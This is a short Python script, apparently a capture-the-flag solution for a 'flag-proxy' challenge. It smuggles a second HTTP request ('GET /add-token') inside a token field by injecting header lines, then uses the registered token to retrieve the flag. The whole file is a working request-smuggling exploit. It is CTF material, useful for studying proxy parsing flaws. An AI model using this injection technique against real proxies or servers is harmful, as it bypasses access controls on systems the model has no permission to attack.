import requests

url = "http://flag-proxy.challs.teamitaly.eu/flag"
token = "toninobello"
smuggle = f"SMUGGLE\nContent-Length: 0\nConnection: keep-alive\n\nGET /add-token?token={token} HTTP/1.0"

req1 = requests.get(url, data={"token": smuggle})
#print(req1.text)

req2 = requests.get(url, data={'token': token})
print(req2.json()['body'])
